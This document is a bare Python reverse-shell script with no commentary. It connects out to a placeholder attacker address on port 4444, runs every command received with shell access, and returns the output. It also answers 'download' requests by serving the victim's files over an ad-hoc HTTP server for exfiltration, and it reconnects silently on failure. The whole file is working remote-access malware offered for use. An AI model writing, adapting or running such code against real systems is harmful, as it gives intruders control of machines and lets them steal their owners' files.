import socket
import subprocess
import os
import time
import threading

ATTACKER_IP = " ATTACKER IP"  #
PORT = 4444  # Reverse shell port
HTTP_PORT = 8080  # File transfer HTTP server port

def start_http_server(directory):
    """Starts an HTTP server in the given directory"""
    os.chdir(directory)
    command = f"python -m http.server {HTTP_PORT}"
    subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def reverse_shell():
    """Creates a reverse shell and handles commands from the attacker"""
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ATTACKER_IP, PORT))
            
            while True:
                cmd = client.recv(4096).decode().strip()
                if cmd.lower() == "exit":
                    break
                
                elif cmd.startswith("download "):
                    filename = cmd.split(" ", 1)[1]
                    if os.path.exists(filename):
                        file_dir = os.path.dirname(os.path.abspath(filename)) or os.getcwd()
                        threading.Thread(target=start_http_server, args=(file_dir,)).start()
                        time.sleep(1)  # Wait for server to start
                        ip_addr = socket.gethostbyname(socket.gethostname())
                        download_link = f"http://{ip_addr}:{HTTP_PORT}/{os.path.basename(filename)}"
                        client.send(f"File available at: {download_link}\n".encode())
                    else:
                        client.send("File not found.\n".encode())

                else:
                    output = subprocess.run(cmd, shell=True, capture_output=True)
                    client.send(output.stdout + output.stderr)
            
            client.close()
        except:
            time.sleep(5)  # Avoid excessive reconnection attempts

if __name__ == "__main__":
    reverse_shell()
